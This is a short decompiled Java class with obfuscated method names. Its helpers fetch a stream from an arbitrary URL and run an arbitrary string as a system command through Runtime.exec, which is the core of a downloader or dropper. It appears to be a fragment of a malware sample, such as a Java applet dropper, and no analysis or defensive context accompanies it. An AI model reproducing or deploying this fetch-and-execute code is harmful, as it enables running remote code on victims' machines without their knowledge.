import java.net.URL;
import java.io.InputStream;

// 
// Decompiled by Procyon v0.5.30
// 

public class Sopil
{
    public static Runtime Sduwll() {
        return Runtime.getRuntime();
    }
    
    public static InputStream Olsko(final String oiepjsb) throws Exception {
        final URL plmne = new URL(oiepjsb);
        int cnt = 0;
        try {
            plmne.openConnection();
            ++cnt;
        }
        catch (Exception ex) {}
        return plmne.openStream();
    }
    
    public static void LksLL(final String fn) throws Exception {
        final Process ldpd = Sduwll().exec(fn);
        ldpd.waitFor();
    }
}
